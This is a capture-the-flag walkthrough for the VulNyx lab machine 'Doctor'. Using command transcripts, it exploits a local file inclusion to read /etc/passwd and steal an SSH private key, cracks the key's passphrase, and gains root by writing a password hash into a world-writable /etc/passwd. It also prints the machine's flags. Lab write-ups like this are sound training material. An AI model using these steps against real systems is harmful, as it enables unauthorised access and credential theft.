# DOCTOR - VulNyx
Doctor is a vulnerable Linux virtual machine of low difficuty from VulNyx platform, create by the user m0w and works correctly in the VirtualBox and VMware hypervisors.
## Solution
### Enumeration
Use Nmap to scan the ports on the Doctor's IP address
```bash
┌──(dungcngo㉿kali)-[~]
└─$ nmap -n -Pn -sS -p- --min-rate 5000 192.168.100.105
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 00:33 EST
Nmap scan report for 192.168.100.105
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2A:85:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 123.75 seconds
```
```bash
┌──(dungcngo㉿kali)-[~]
└─$ nmap -sVC -p22,80 192.168.100.105
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 01:15 EST
Nmap scan report for 192.168.100.105
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Docmed
MAC Address: 08:00:27:2A:85:8D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
```
### Shell (Admin)
#### Directory Brute Force
```bash
┌──(dungcngo㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.100.105 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.105
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 316] [--> http://192.168.100.105/img/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.100.105/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.100.105/js/]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.100.105/fonts/]
/server-status        (Status: 403) [Size: 280]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```
We found several directories on the server (img, js, css, fonts). However, these are common static  directories and offer little exploitation value.
The /server-status directory is a significant hidden endpoint. Although access is restricted, its presence indicates that the server has this module enabled. If it is misconfigured, it could become an attack vector.
#### Local File Inclusion (LFI)
In the Doctor section of the navigation bar, you can see that `doctor-item.php` includes the `Doctors.html` page.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ curl -sX GET "http://192.168.100.105/doctor-item.php?include=/etc/passwd"       
root:$1$9OulkNQ.$m8PjZtbJfJ2CgfW5yMazL0:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash
```
We can confirm that it is vulnerable to an LFI attack because we were able to read the `/etc/passwd` file, and also enumerated the administrative and root users.

We can obtain the `admin` user's private `id_rsa` key.
```bash
┌──(dungcngo㉿kali)-[~]
└─$ curl -sX GET "http://192.168.100.105/doctor-item.php?include=/home/admin/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```
#### Cracking (id_rsa)
Create an `id_rsa` file and copy the key data to the local machine. Then use John the Ripper to crack the SSH private key passphrase.
```bash
┌──(root㉿kali)-[/home/dungcngo]
└─# ssh2john id_rsa > admin.hash  
```
```bash
┌──(root㉿kali)-[/home/dungcngo]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)     
1g 0:00:00:00 DONE (2026-01-29 01:56) 20.00g/s 24960p/s 24960c/s 24960C/s pedro..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We have password `unicorn` of `id_rsa`.

We log into the system as the admin user.
```bash
┌──(root㉿kali)-[/home/dungcngo]
└─# ssh -i id_rsa admin@192.168.100.105                                 
The authenticity of host '192.168.100.105 (192.168.100.105)' can't be established.
ED25519 key fingerprint is SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.105' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
admin@doctor:~$ ls -la; whoami
total 32
drwx------ 4 admin admin 4096 ene 28 09:21 .
drwxr-xr-x 3 root  root  4096 abr 21  2023 ..
lrwxrwxrwx 1 root  root     9 ago 16  2021 .bash_history -> /dev/null
-rwx------ 1 admin admin  220 ago 16  2021 .bash_logout
-rwx------ 1 admin admin 3526 ago 16  2021 .bashrc
drwxr-xr-x 3 admin admin 4096 ene 28 09:21 .local
-rwx------ 1 admin admin  807 ago 16  2021 .profile
drwx------ 2 admin admin 4096 ago 16  2021 .ssh
-r-------- 1 admin admin   33 abr 21  2023 user.txt
admin
```
### Privilege Escalation
#### Enumeration
**Writable Files**

Enumerate all regular files on the system that the user has write permissions for.
```bash
admin@doctor:~$ find / -writable -type f 2>/dev/null | grep -viE "var|proc|sys|home"
/etc/passwd
admin@doctor:~$ ls -l /etc/passwd
-rw----rw- 1 root root 1425 ene 28 09:22 /etc/passwd
```
#### Abuse
Use OpenSSL to generate an MD5 crypt hash of the password `98765`.
```bash
admin@doctor:~$ openssl passwd -1 98765
$1$eL/PkhrA$Bw4VkHBfUT4XTl75cGJsX.
```
On the `root` user's line, we remove the `x` and paste the previously generated hash so that password authentication is performed using the `/etc/passwd` file instead of `/etc/shadow`.
```bash
admin@doctor:~$ grep root /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin@doctor:~$ nano /etc/passwd
admin@doctor:~$ grep root /etc/passwd
root:$1$eL/PkhrA$Bw4VkHBfUT4XTl75cGJsX:0:0:root:/root:/bin/bash
```
We become the `root` user.
```bash
admin@doctor:~$ su -
Contraseña: 
root@doctor:~# id; hostname
uid=0(root) gid=0(root) grupos=0(root)
doctor
root@doctor:~# 
```
#### Flags
As the `root` user, we can read the user.txt and root.txt flags.
```bash
root@doctor:~# find / -name user.txt -o -name root.txt | xargs cat
0819e6dfb35db7c61353e4dce311b397
dfde8cc67ed8819b2386dc74e472ecc6
```
***You are welcome!***
